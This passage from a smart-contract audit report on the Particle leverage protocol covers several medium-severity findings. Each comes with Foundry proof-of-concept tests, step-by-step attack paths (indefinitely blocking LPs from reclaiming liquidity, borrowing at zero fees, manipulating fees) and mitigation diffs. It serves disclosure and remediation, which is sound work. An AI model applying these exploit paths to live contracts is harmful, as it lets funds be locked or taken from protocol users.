        amountFrom += (amountSwap * FEE_FACTOR) / (BASIS_POINT - FEE_FACTOR);

        // user supplies a large `marginTo` to get a big premium
        uint256 marginTo = requiredEth - amount1ToBorrow + 1;

        vm.startPrank(WHALE);
        USDC.transfer(SWAPPER, amountFrom);
        WETH.transfer(SWAPPER, marginTo);
        vm.stopPrank();

        vm.startPrank(SWAPPER);
        TransferHelper.safeApprove(address(USDC), address(particlePositionManager), amountFrom);
        TransferHelper.safeApprove(address(WETH), address(particlePositionManager), marginTo);

        // impossible as it will revert on underflow
        vm.expectRevert(stdError.arithmeticError);
        particlePositionManager.openPosition(
            DataStruct.OpenPositionParams({
                tokenId: _tokenId,
                marginFrom: amountFrom,
                marginTo: marginTo,
                amountSwap: amountSwap,
                liquidity: borrowerLiquidity,
                tokenFromPremiumPortionMin: 0,
                tokenToPremiumPortionMin: 0,
                marginPremiumRatio: type(uint8).max,
                zeroForOne: true,
                data: new bytes(0) // will not make it to the swap
            })
        );
        vm.stopPrank();
    }
```
### Recommended Mitigation Steps

Consider not counting `marginTo` towards expected output from the swap. As shown in another issue, there are further problems with this. `marginTo` is the premium for the "to"-side of the position. Hence should not be part of the expected output of the swap as it is the safety for the position.

**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/44#issuecomment-1868218912):**
 > Oh this is very interesting and careful point! So instead of the current check, we can do
> 
> ```
> params.marginTo > collateralTo - cache.amountToBorrowed ? 0 : collateralTo - cache.amountToBorrowed - params.marginTo
> ```
> 
> We still need marginTo to make the minimum amount for the swap right, happy to go back to the figures in https://excalidraw.com/#json=TcmwLn2W4K9H_UlCExFXa,J_yKjXNaowF0gYL8uvPruA for further discussion.
>
 > Confirm with the issue but our intended fix is slightly different from suggested.

***

## [[M-08] collectLiquidity() Lack of can specify recipient leads to inability to retrieve token1 after entering the blacklist of token0](https://github.com/code-423n4/2023-12-particle-findings/issues/36)
*Submitted by [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/36)*

`LP` has only one way to retrieve `token`, first `decreaseLiquidity()`, then retrieve through the `collectLiquidity()` method.

`collectLiquidity()` only has one parameter, `tokenId`.

```solidity
    function collectLiquidity(
        uint256 tokenId
    ) external override nonReentrant returns (uint256 amount0Collected, uint256 amount1Collected) {
        (amount0Collected, amount1Collected) = lps.collectLiquidity(tokenId);
    }
```

So `LP` can only transfer the retrieved `token` to himself: `msg.sender`.

This leads to a problem. If `LP` enters the blacklist of a certain `token`, such as the `USDC` blacklist,

Because the recipient cannot be specified (`lps[]` cannot be transferred), this will cause another `token` not to be retrieved, such as `WETH`.

Refer to `NonfungiblePositionManager.collect()` and `UniswapV3Pool.collect()`, both can specify `recipient` to avoid this problem.

### Impact

`collectLiquidity()` cannot specify the recipient, causing `LP` to enter the blacklist of a certain token, and both tokens cannot be retrieved.

### Recommended Mitigation

```diff
    function collectLiquidity(
        uint256 tokenId,
+      address recipient
    ) external override nonReentrant returns (uint256 amount0Collected, uint256 amount1Collected) {
...
```

**[wukong-particle (Particle) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/36#issuecomment-1868216251):**
 > Good suggestion, recipient should be added here too: https://github.com/code-423n4/2023-12-particle/blob/main/contracts/libraries/LiquidityPosition.sol#L329 


**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/36#issuecomment-1868382997):**
 > I would argue this is good design and should not be changed to allow for arbitrary recipients. If a token is blacklisted, and a protocol allows the user to circumvent this blacklist, then they may potentially be liable for the behaviour of this individual. Better to take an agnostic approach and leave it as is unless liquidations are ultimately being limited because of this.

**[wukong-particle (Particle) acknowledged and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/36#issuecomment-1868471782):**
 > I agree with the judge. We shouldn't facilitate to temper the blacklist. So only acknowledging the issue.

***

## [[M-09] reclaimLiquidity() Malicious borrowers can force LPs to be unable to retrieve Liquidity by closing and reopening the Position before it expires](https://github.com/code-423n4/2023-12-particle-findings/issues/35)
*Submitted by [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/35), also found by [adriro](https://github.com/code-423n4/2023-12-particle-findings/issues/53) and [immeas](https://github.com/code-423n4/2023-12-particle-findings/issues/42)*

If `LP` wants to retrieve the `Liquidity` that has been lent out, it can set a `renewalCutoffTime` through `reclaimLiquidity()`.
If the `borrower` does not voluntarily close, `liquidatePosition()` can be used to forcibly close the `position` after the loan expires.

```solidity
    function liquidatePosition(
        DataStruct.ClosePositionParams calldata params,
        address borrower
    ) external override nonReentrant {
...
        if (
            !((closeCache.tokenFromPremium < liquidateCache.tokenFromOwed ||
                closeCache.tokenToPremium < liquidateCache.tokenToOwed) ||
@>              (lien.startTime < lps.getRenewalCutoffTime(lien.tokenId) &&
@>                 lien.startTime + LOAN_TERM < block.timestamp))
        ) {
            revert Errors.LiquidationNotMet();
        }
```

To forcibly close the `position`, we still need to wait for the expiration `block.timestamp > lien.startTime + LOAN_TERM`.

But currently, `openPosition()` is not restricted by `renewalCutoffTime`, as long as there is `Liquidity`, we can open a position.

In this way, malicious borrowers can continuously occupy `Liquidity` by closing and reopening before expiration.
For example:

1.  The borrower executes `open position`, LOAN_TERM = 7 days
2.  LP executes `reclaimLiquidity()` to retrieve `Liquidity`
3.  On the 6th day, borrower execute `closePosition()` -> `openPosition()`
4.  The new `lien.startTime = block.timestamp`
5.  LP needs to wait another `7 days`
6.  The borrower repeats the 3rd step, indefinitely postponing

The borrower may need to pay a certain `fee` when `openPosition()`.
If the benefits can be expected, it is very cost-effective.

### Impact

Malicious borrowers can force LPs to be unable to retrieve Liquidity by closing and reopening the Position before it expires.

### Recommended Mitigation

It is recommended that when `openPosition()`, if the current time is less than `renewalCutoffTime + LOAN_TERM + 1 days`, do not allow new `positions` to be opened, giving `LP` a time window for retrieval.

Or set a new flag `TOKEN_CLOSE = true` to allow `lp` to specify that Liquidity will no longer be lent out.

```diff
    function openPosition(
        DataStruct.OpenPositionParams calldata params
    ) public override nonReentrant returns (uint96 lienId, uint256 collateralTo) {
...
+     require(block.timestamp > (lps[params.tokenId].renewalCutoffTime + LOAN_TERM + 1 days),"LP Restrict Open ");
    
```

**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/35#issuecomment-1868215865):**
 > This is an interesting discovery. Our original thinking was after `reclaim`, LP can withdraw liquidity in one tx via multicall. But the problem here is that the already borrowed liquidity can be extended indefinitely.  We should probably just restrict new positions to be opened if `reclaim` is called. And the suggested change is also valid. Thanks! 


***

## [[M-10] malicious borrowers can follow reclaimLiquidity() then execute addPremium() to invalidate renewalCutoffTime](https://github.com/code-423n4/2023-12-particle-findings/issues/33)
*Submitted by [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/33), also found by [ladboy233](https://github.com/code-423n4/2023-12-particle-findings/issues/4)*

`LP` can set `renewalCutoffTime=block.timestamp` by executing `reclaimLiquidity()`, to force close position

```solidity
    function liquidatePosition(
        DataStruct.ClosePositionParams calldata params,
        address borrower
    ) external override nonReentrant {
...

        if (
            !((closeCache.tokenFromPremium < liquidateCache.tokenFromOwed ||
                closeCache.tokenToPremium < liquidateCache.tokenToOwed) ||
@>              (lien.startTime < lps.getRenewalCutoffTime(lien.tokenId) &&
                    lien.startTime + LOAN_TERM < block.timestamp)) 
        ) {
            revert Errors.LiquidationNotMet();
        }
```

The restrictions are:

1.  Loan expires
2.  lien.startTime < lps.getRenewalCutoffTime(lien.tokenId)

Since `addPremium()` will modify `lien.startTime = block.timestamp`, we need to restrict , if `lps.getRenewalCutoffTime(lien.tokenId) > lien.startTime`, `addPremium()` cannot be executed.
Otherwise, `addPremium()` can indefinitely postpone `liquidatePosition()` to forcibly close `position`.

```solidity
    function addPremium(uint96 lienId, uint128 premium0, uint128 premium1) external override nonReentrant {
..
@>     if (lps.getRenewalCutoffTime(lien.tokenId) > lien.startTime) revert Errors.RenewalDisabled();

```

The problem is that this judgment condition is `>`, so if `lps.getRenewalCutoffTime(lien.tokenId) == lien.startTime`, it can be executed.

This leads to, the `borrower` can monitor the `mempool`, if `LP` executes `reclaimLiquidity()`, front-run or follow closely to execute `addPremium(0)`. It can be executed successfully, resulting in `lien.startTime == lps[tokenId].renewalCutoffTime == block.timestamp`.

In this case, `liquidatePosition()` will fail  ,  because the current condition for `liquidatePosition()` is `lien.startTime < lps.getRenewalCutoffTime(lien.tokenId)`, `liquidatePosition()` will `revert Errors.LiquidationNotMet();`.

So by executing `reclaimLiquidity()` and `addPremium()` in the same block, it can maliciously continuously prevent `LP` from retrieving Liquidity.

### Impact

Malicious borrowers can follow `reclaimLiquidity()` then execute `addPremium()` to invalidate `renewalCutoffTime`, thereby maliciously preventing the position from being forcibly closed, and `LP` cannot retrieve Liquidity.

### Recommended Mitigation

Use `>= lien.startTime` to replace `> lien.startTime`.

In this way, the `borrower` has at most one chance and cannot postpone indefinitely.

```diff
    function addPremium(uint96 lienId, uint128 premium0, uint128 premium1) external override nonReentrant {
..
-       if (lps.getRenewalCutoffTime(lien.tokenId) > lien.startTime) revert Errors.RenewalDisabled();
+       if (lps.getRenewalCutoffTime(lien.tokenId) >= lien.startTime) revert Errors.RenewalDisabled();
```

**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/33#issuecomment-1868215080):**
 > Good discovery. The suggested change for `>` into `>=` is pretty elegant and smart. Thanks!

**[0xLeastwood (Judge) increased severity to High and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/33#issuecomment-1868376047):**
 > I would consider this pretty severe, not only can you prevent an LP from receiving their liquidity back. The borrower is able to maintain an unhealthy position. Upgrading to high severity.

**[adriro (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/33#issuecomment-1872538739):**
> I don't think this a high severity issue. The borrower can front-run `reclaimLiquidity()` (which is also a difficult task to successfully execute every time, and impossible if using private mempools), but the position can still be liquidated if unhealthy, since the liquidation condition also considers an scenario where the margin doesn't cover fees `(closeCache.tokenFromPremium < liquidateCache.tokenFromOwed || closeCache.tokenToPremium < liquidateCache.tokenToOwed)`.


**[0xleastwood (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/33#issuecomment-1872946704):**
> Hmm, that is true. There isn't much risk here of generating bad debt so I will downgrade to medium severity. Thanks!

***

## [[M-11] openPosition() Lack of minimum token0PremiumPortion/token1PremiumPortion limit](https://github.com/code-423n4/2023-12-particle-findings/issues/27)
*Submitted by [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/27), also found by [immeas](https://github.com/code-423n4/2023-12-particle-findings/issues/38)*

In `openPosition()`, it allows `token0PremiumPortion` and `token1PremiumPortion` to be 0 at the same time.

In this case, if `tokenId` enters `out_of_price`, for example, `UpperOutOfRange`, anyone might be able to input:

    marginFrom = 0
    marginTo = 0
    amountSwap = 0
    zeroForOne = false
    liquidity > 0

Note: `amountFromBorrowed + marginFrom == 0`, so `fees ==0`

To open a new Position, borrow Liquidity, but without paying any fees. It's basically a no-cost loan.

### Impact

`out_of_price` tokenId, due to the no-cost loan, might lead to the following issues:

1.  Malicious occupation of Liquidity
2.  Since both `token0Premium/token1Premium` are 0, the liquidator will not execute `liquidatePosition()`, because there is no profit.
3.  Since both `token0Premium/token1Premium` are 0, `LP` cannot get fees, but the borrower might still be able to profit.

### Proof of Concept

The following test case demonstrates that if it is `out_of_price`, anyone can borrow at no cost.

Add to `OpenPosition.t.sol`:

```solidity
    function testZeroFees() public {
        _setupUpperOutOfRange();
        uint128 borrowerLiquidity = _liquidity / _borrowerLiquidityPorition;
        console.log("borrowerLiquidity:",borrowerLiquidity);
        address anyone = address(0x123999);
        vm.startPrank(anyone);
        particlePositionManager.openPosition(
            DataStruct.OpenPositionParams({
                tokenId: _tokenId,
                marginFrom: 0,
                marginTo: 0,
                amountSwap: 0,
                liquidity: borrowerLiquidity,
                tokenFromPremiumPortionMin: 0,
                tokenToPremiumPortionMin: 0,
                marginPremiumRatio: type(uint8).max,
                zeroForOne: false,
                data: ""
            })
        );
        vm.stopPrank();
        (
            ,
            uint128 liquidity,
            ,
            uint128 token0Premium,
            uint128 token1Premium,
            ,
            ,            
        ) = particleInfoReader.getLien(anyone, 0);
        console.log("liquidity:",liquidity);
        console.log("token0Premium:",token0Premium);
        console.log("token1Premium:",token1Premium);
    }
```

```console
Logs:
  borrowerLiquidity: 1739134199054731
  liquidity: 1739134199054731
  token0Premium: 0
  token1Premium: 0
```

### Recommended Mitigation

It is suggested that `openPosition()` should add a minimum `token0PremiumPortion/token1PremiumPortion` limit.

```diff
    function openPosition(
        DataStruct.OpenPositionParams calldata params
    ) public override nonReentrant returns (uint96 lienId, uint256 collateralTo) {
...

+       require(params.tokenFromPremiumPortionMin>=MIN_FROM_PREMIUM_PORTION,"invalid tokenFromPremiumPortionMin");
+       require(params.tokenToPremiumPortionMin>=MIN_TO_PREMIUM_PORTION,"invalid tokenToPremiumPortionMin");
```

**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/27#issuecomment-1868214226):**
 > It's a good suggestion. We will add minimum premium in contract (current frontend enforces a minimum 1-2%).


***

## [[M-12] Position can be opened even when the particle position manger does not hold the Uniswap V3 Position NFT](https://github.com/code-423n4/2023-12-particle-findings/issues/22)
*Submitted by [ladboy233](https://github.com/code-423n4/2023-12-particle-findings/issues/22)*

As long as user approve the PositionManager for as a operator of their NFT position.

Even the particle position manager does not hold the Uniswap V3 NFT.

Anyone can open the position on behalf of the original NFT owner.

The original owner may incapable of calling reclaimLiquidity and the borrower just open the position to reduce the original liquidity, as long as he maintain sufficient premium, he will never be liquidated.

Even if the original own is capable of calling reclaim liquidity, the borrower is still capable of leverage trading for LOAN_TERM length while forcefully reduce the liquidity of original nft. This is because when open the position, the code does not check if the particile position manager hold the Uniswap V3 NFT. The external call to decrease liquidity and collect the token is subject to the check:

<https://etherscan.io/address/0xc36442b4a4522e871399cd717abdd847ab11fe88#code#F1#L184>

```solidity
   modifier isAuthorizedForToken(uint256 tokenId) {
        require(_isApprovedOrOwner(msg.sender, tokenId), 'Not approved');
        _;
    }
```

While user approve ParticlePositionManager is not a normal flow, user approve particlePositionManager does not signal user wants to borrow the fund. Only when the user transfers the NFT into the ParticlePositionManager, the borrower can borrow with lender's implicit permission.

### Recommended Mitigation Steps

Recommendation validating the particle position manager holds the position nft when position is opened.

**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/22#issuecomment-1868211672):**
 > Oh this is very interesting! Basically increase/decrease liquidity only requires approval, as opposed to owning the NFTs. Indeed, only approving Particle doesn't mean that an LP wants to lend the liquidity. Would be great if there's a coded PoC but the current report should be sufficient. We will add an ownership check in our contract. Thanks!


***

## [[M-13] Malicious lender can manipulate the fee to force borrower pay high premium](https://github.com/code-423n4/2023-12-particle-findings/issues/18)
*Submitted by [ladboy233](https://github.com/code-423n4/2023-12-particle-findings/issues/18)*

When user creates a position, the fee is snapshot is queryed from uniswap v3 position manager when [preparing leverage](https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/Base.sol#L132)

```solidity
    function prepareLeverage(
        uint256 tokenId,
        uint128 liquidity,
        bool zeroForOne
    )
        internal
        view
        returns (
            address tokenFrom,
            address tokenTo,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint256 collateralFrom,
            uint256 collateralTo
        )
    {
        int24 tickLower;
        int24 tickUpper;
        (
            ,
            ,
            tokenFrom,
            tokenTo,
            ,
            tickLower,
            tickUpper,
            ,
            feeGrowthInside0LastX128,
            feeGrowthInside1LastX128,
            ,

        ) = UNI_POSITION_MANAGER.positions(tokenId);
```

and stored in the lien struct

```solidity
// prepare data for swap
(
	cache.tokenFrom,
	cache.tokenTo,
	cache.feeGrowthInside0LastX128,
	cache.feeGrowthInside1LastX128,
	cache.collateralFrom,
	collateralTo
) = Base.prepareLeverage(params.tokenId, params.liquidity, params.zeroForOne);
```

then [stored in the liens struct](https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L247)

```solidity
// create a new lien
liens[keccak256(abi.encodePacked(msg.sender, lienId = _nextRecordId++))] = Lien.Info({
	tokenId: uint40(params.tokenId), // @audit
	liquidity: params.liquidity,
	token0PremiumPortion: cache.token0PremiumPortion,
	token1PremiumPortion: cache.token1PremiumPortion,
	startTime: uint32(block.timestamp),
	feeGrowthInside0LastX128: cache.feeGrowthInside0LastX128,
	feeGrowthInside1LastX128: cache.feeGrowthInside1LastX128,
	zeroForOne: params.zeroForOne
});
```

then when the position is closed, the [premium interested paid depends on the spot value of the fee](https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L442)

```solidity
// obtain the position's latest FeeGrowthInside after increaseLiquidity
(, , , , , , , , cache.feeGrowthInside0LastX128, cache.feeGrowthInside1LastX128, , ) = Base
	.UNI_POSITION_MANAGER
	.positions(lien.tokenId);

// caculate the amounts owed since last fee collection during the borrowing period
(cache.token0Owed, cache.token1Owed) = Base.getOwedFee(
	cache.feeGrowthInside0LastX128,
	cache.feeGrowthInside1LastX128,
	lien.feeGrowthInside0LastX128,
	lien.feeGrowthInside1LastX128,
	lien.liquidity
);
```

If the fee increased during the position opening time, the premium is used to cover the fee to make sure there are incentive for lenders to deposit V3 NFT as lender.

As the comments point out:

> // calculate the the amounts owed to LP up to the premium in the lien<br>
> // must ensure enough amount is left to pay for interest first, then send gains and fund left to borrower

However, because the fee amount is queried from position manager in spot value, malicious lender increase the liquidity to that ticker range and then can swap back and forth between ticker range to inflate the fee amount to force borrower pay high fee / high premium, while the lender has to pay the gas cost + uniswap trading fee.

But if the lender [adds more liquidity](https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L118) to nft's ticker range, he can collect the majority of the liqudity fee + collect high premium from borrower (or forcefully liquidated user to take premium).

### Recommended Mitigation Steps

It is recommend to cap the premium interest payment instead of query spot fee amount to avoid swap fee manipulation.

**[adriro (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/18#issuecomment-1867761631):**
 > The attack is quite impractical, the attacker would need to spend fees between all other LPs in range of the pool, so to get a small portion of it back.

**[Ladboy233 (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/18#issuecomment-1867775137):**
 > Thanks for reviewing my submission @adriro
> 
> > spend fees between all other LPs in range of the pool
> 
> As the original report points out, the lender can always [add more liquidity](https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L118) to nft's ticker range to get more share of the fee.
> 
> If he provides majority of the liquidity, he gets majority of the fee.
> 
> So as long as the premium added by borrower > gas cost + uniswap trading fee, the borrower is forced to lose money and the lender loses nothing.

**[wukong-particle commented](https://github.com/code-423n4/2023-12-particle-findings/issues/18#issuecomment-1868186767):**
 > I tend to agree with @adriro on the general direction here. But let's play out the scenario @ladboy233 outlined --
> 
> So for the attacker to be profitable, the amount they earn from liquidating a position should outweigh the swapping fees they pay to all *other* LPs.
> 
> Basically, Alice the attacker would need the fee generated in her borrowed liquidity to be more than the fee generated by all other LPs combined that cover her borrowed liquidity's tick range. Note that it should be other liquidity that "cover" the borrowed liquidity range (this even including full range).
> 
> This basically requires Alice to be the absolute dominating LP on the entire pool. If that kind of whale is swimming in our protocol, well, I think smart traders will be cautious and that LP won't earn as much in the first place. Basically the incentive will be very low based on typical investment-return ratio.
> 
> However, I do worry that some flash loan might have some attack angle -- flash loan enormous and outweigh other LPs. But that require the *borrowed* amount to outweigh other LPs, this doesn't seem to be doable with one tx flash loan. 
> 
> Along this line though, if there's other novel attack pattern, happy to discuss any time!

**[Ladboy233 (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/18#issuecomment-1868283407):**
 > > So for the attacker to be profitable, the amount they earn from liquidating a position should outweigh the swapping fees they pay to all other LPs.
> 
> Yes, premium collected > gas cost + uniswap trading fee + fee paid to all other LPs
> 
> Lender cannot control how much premium borrowers add.
> 
> But if lender see borrower's more premium is valuable
> 
> > This basically requires Alice to be the absolute dominating LP on the entire pool. If that kind of whale is swimming in our protocol, well, I think smart traders will be cautious and that LP won't earn as much in the first place.
> 
> Even if does not dominate the LP range in the beginning, he can always increase liquidity to dominate the LP range.

**[wukong-particle (Particle) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/18#issuecomment-1868469522):**
 > Acknowledge the issue because it's indeed a possible manipulation angle. But as the discussion goes above, this attack is very impractical, unless the LP is the absolute dominance. 
> 
> Also disagree with severity because such attack is not practical in economic terms.
> 
> Will let the judge join the discussion and ultimately decide. Thanks!

**[0xLeastwood (Judge) decreased severity to Medium](https://github.com/code-423n4/2023-12-particle-findings/issues/18#issuecomment-1868504895)**

**[adriro (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/18#issuecomment-1872538901):**
 > @0xleastwood I'll reiterate my previous comment that this is impractical, there's no reason to perform this attack. Profitable conditions to trigger this attack are impossible in practice. Seems more on the QA side to me.

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/18#issuecomment-1872945940):**
 > While the attack is impractical in most cases, it is not infeasible. The attacker stands to profit under certain conditions so keeping this as is.

***

## [[M-14] Excess tokens that are not accounted in the token premium portion stuck in the `ParticlePositionManager`](https://github.com/code-423n4/2023-12-particle-findings/issues/7)
*Submitted by [said](https://github.com/code-423n4/2023-12-particle-findings/issues/7)*

Excess tokens from margins provided by traders when opening position could become stuck inside the `ParticlePositionManager` due to precision loss when calculating the token premium portion.

### Proof of Concept

When traders call `openPosition`, eventually it will calculate `cache.token0PremiumPortion` and `cache.token1PremiumPortion` before putting it into lien data.

<https://github.com/code-423n4/2023-12-particle/blob/main/contracts/protocol/ParticlePositionManager.sol#L218-L244>

<details>

```solidity
    /// @inheritdoc IParticlePositionManager
    function openPosition(
        DataStruct.OpenPositionParams calldata params
    ) public override nonReentrant returns (uint96 lienId, uint256 collateralTo) {
       ...
        if (params.zeroForOne) {
>>>         cache.token0PremiumPortion = Base.uint256ToUint24(
                ((params.marginFrom + cache.amountFromBorrowed - cache.feeAmount - cache.amountSpent) *
                    Base.BASIS_POINT) / cache.collateralFrom
            );
>>>         cache.token1PremiumPortion = Base.uint256ToUint24(
                ((cache.amountReceived + cache.amountToBorrowed + params.marginTo - collateralTo) * Base.BASIS_POINT) /
                    collateralTo
            );
            if (
                cache.token0PremiumPortion < params.tokenFromPremiumPortionMin ||
                cache.token1PremiumPortion < params.tokenToPremiumPortionMin
            ) revert Errors.InsufficientPremium();
        } else {
>>>         cache.token1PremiumPortion = Base.uint256ToUint24(
                ((params.marginFrom + cache.amountFromBorrowed - cache.feeAmount - cache.amountSpent) *
                    Base.BASIS_POINT) / cache.collateralFrom
            );
>>>         cache.token0PremiumPortion = Base.uint256ToUint24(
                ((cache.amountReceived + cache.amountToBorrowed + params.marginTo - collateralTo) * Base.BASIS_POINT) /
                    collateralTo
            );
            if (
                cache.token0PremiumPortion < params.tokenToPremiumPortionMin ||
                cache.token1PremiumPortion < params.tokenFromPremiumPortionMin
            ) revert Errors.InsufficientPremium();
        }

        // create a new lien
        liens[keccak256(abi.encodePacked(msg.sender, lienId = _nextRecordId++))] = Lien.Info({
            tokenId: uint40(params.tokenId),
            liquidity: params.liquidity,
            token0PremiumPortion: cache.token0PremiumPortion,
            token1PremiumPortion: cache.token1PremiumPortion,
            startTime: uint32(block.timestamp),
            feeGrowthInside0LastX128: cache.feeGrowthInside0LastX128,
            feeGrowthInside1LastX128: cache.feeGrowthInside1LastX128,
            zeroForOne: params.zeroForOne
        });

        emit OpenPosition(msg.sender, lienId, collateralTo);
    }
```
</details>

It can be observed that when calculating `cache.token0PremiumPortion` and `cache.token1PremiumPortion`, precision loss could occur, especially when the token used has a high decimals (e.g. 18) while `BASIS_POINT` used only `1_000_000`. When this happens, the token could become stuck inside the `ParticlePositionManager`.

Coded PoC :

The PoC goal is to check the amount of tokens inside the `ParticlePositionManager` after the position is opened, premium is added, liquidated, the LP withdraws the tokens and collects fees, and the admin collects the treasury.

Add the following test inside `test/OpenPosition.t.sol` and also add `import "forge-std/console.sol";` to the test contract.

<details>

```solidity
   function testLiquidateAndClearLiquidity() public {
        address LIQUIDATOR = payable(address(0x7777));
        uint128 REPAY_LIQUIDITY_PORTION = 1000;
        testBaseOpenLongPosition();
        // add enough premium
        uint128 premium0 = 500 * 1e6;
        uint128 premium1 = 0.5 ether;
        vm.startPrank(WHALE);
        USDC.transfer(SWAPPER, premium0);
        WETH.transfer(SWAPPER, premium1);
        vm.stopPrank();

        vm.startPrank(SWAPPER);
        TransferHelper.safeApprove(address(USDC), address(particlePositionManager), premium0);
        TransferHelper.safeApprove(address(WETH), address(particlePositionManager), premium1);
        particlePositionManager.addPremium(0, premium0, premium1);
        vm.stopPrank();
        // get lien info
        (, uint128 liquidityInside, , , , , , ) = particlePositionManager.liens(
            keccak256(abi.encodePacked(SWAPPER, uint96(0)))
        );
        // start reclaim
        vm.startPrank(LP);
        vm.warp(block.timestamp + 1);
        particlePositionManager.reclaimLiquidity(_tokenId);
        vm.stopPrank();
        // add back liquidity requirement
        vm.warp(block.timestamp + 7 days);
        IUniswapV3Pool _pool = IUniswapV3Pool(uniswapV3Factory.getPool(address(USDC), address(WETH), FEE));
        (uint160 currSqrtRatioX96, , , , , , ) = _pool.slot0();
        (uint256 amount0ToReturn, uint256 amount1ToReturn) = LiquidityAmounts.getAmountsForLiquidity(
            currSqrtRatioX96,
            _sqrtRatioAX96,
            _sqrtRatioBX96,
            liquidityInside + liquidityInside / REPAY_LIQUIDITY_PORTION
        );
        (, uint256 ethCollateral) = particleInfoReader.getRequiredCollateral(liquidityInside, _tickLower, _tickUpper);

        // get swap data
        uint160 currentPrice = particleInfoReader.getCurrentPrice(address(USDC), address(WETH), FEE);
        uint256 amountSwap = ethCollateral - amount1ToReturn;
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDC),
            fee: FEE,
            recipient: address(particlePositionManager),
            deadline: block.timestamp,
            amountIn: amountSwap,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: currentPrice + currentPrice / SLIPPAGE_FACTOR
        });
        bytes memory data = abi.encodeWithSelector(ISwapRouter.exactInputSingle.selector, params);
        // liquidate position
        vm.startPrank(LIQUIDATOR);
        particlePositionManager.liquidatePosition(
            DataStruct.ClosePositionParams({lienId: uint96(0), amountSwap: amountSwap, data: data}),
            SWAPPER
        );
        vm.stopPrank();
        vm.startPrank(LP);
        // console.log("liquidity before : ");
        // console.log(_liquidity);
        (, , , , , , , _liquidity, , , , ) = nonfungiblePositionManager.positions(_tokenId);
        (uint256 amount0Decreased, uint256 amount1Decreased) = particlePositionManager.decreaseLiquidity(
            _tokenId,
            _liquidity
        );
        (uint256 amount0Returned, uint256 amount1Returned) = particlePositionManager.collectLiquidity(_tokenId);
        vm.stopPrank();
        vm.startPrank(ADMIN);
        particlePositionManager.withdrawTreasury(address(USDC), ADMIN);
        particlePositionManager.withdrawTreasury(address(WETH), ADMIN);
        vm.stopPrank();
        uint256 usdcBalanceAfter = USDC.balanceOf(LP);
        uint256 wethBalanceAfter = WETH.balanceOf(LP);
        console.log("balance LP after - USDC:");
        console.log(usdcBalanceAfter);
        console.log("balance LP after -  WETH:");
        console.log(wethBalanceAfter);
        console.log("balance inside manager -  USDC:");
        console.log(USDC.balanceOf(address(particlePositionManager)));
        console.log("balance inside manager - WETH:");
        console.log(WETH.balanceOf(address(particlePositionManager)));

    }
```

</details>

Run the test :

```shell
forge test -vv --fork-url $MAINNET_RPC_URL --fork-block-number 18750931 --match-contract OpenPositionTest --match-test testLiquidateAndClearLiquidity -vvv
```

Output log :

```shell
  balance LP after - USDC:
  15000228083

  balance LP after -  WETH:
  9999997057795940602

  balance inside manager -  USDC:
  1123

  balance inside manager - WETH:
  516472404479
```

It can be observed that some tokens stuck inside the `ParticlePositionManager` contract.

### Tools Used

Foundry

### Recommended Mitigation Steps

Use a higher scaling for `BASIS_POINT`, considering the fact that tokens commonly have a high number of decimals.

**[wukong-particle (Particle) acknowledged and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/7#issuecomment-1868144864):**
 > Good point. Appreciated the detailed PoC. On our end, I think we should have documented the use of `tokenPremiumPortion` more clearly.  It's a compromise we took to ensure the `lien` structure stored on chain is less than 3 uint256. We compressed a lot and were only left with `uint24`. 
> 
> We think a dust of ~1000 USDC when a user is spending 15B USDC is acceptable. We could add a function to collect dust if needed (might be complicated though). 
> 
> If there can be a serious attack around this dust, please do raise it. Thanks!

**[adriro (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/7#issuecomment-1872539065):**
 > These are leftover amounts that are caused by the rounding of the premium as a portion (premium -> portion -> premium). It looks more on the QA side to me.

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/7#issuecomment-1872947795):**
 > > These are leftover amounts that are caused by the rounding of the premium as a portion (premium -> portion -> premium). It looks more on the QA side to me.
> 
> This seems considerable and will accrue significantly over the lifetime of the protocol. I think the severity is justified as per the judging criteria.
> 
> `2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.`

***

